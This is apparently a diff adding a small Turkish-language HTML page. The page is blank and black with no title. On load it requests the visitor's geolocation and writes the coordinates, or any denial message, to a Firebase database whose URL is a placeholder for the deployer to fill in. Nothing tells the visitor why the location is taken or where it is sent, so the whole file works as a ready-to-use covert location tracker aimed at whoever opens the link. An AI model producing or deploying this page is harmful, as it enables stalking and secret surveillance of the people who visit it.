@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>body { background: #000; margin: 0; }</style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+    <script>
+        const firebaseConfig = { databaseURL: "BURAYA_FIREBASE_DATABASE_URL" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    db.ref('sistem_verileri/konum').set({
+                        enlem: pos.coords.latitude,
+                        boylam: pos.coords.longitude,
+                        durum: "Konum Alındı"
+                    });
+                }, err => { db.ref('sistem_verileri/konum').set({ durum: "Reddedildi: " + err.message }); });
+            }
+        };
+    </script>
+</body>
+</html>
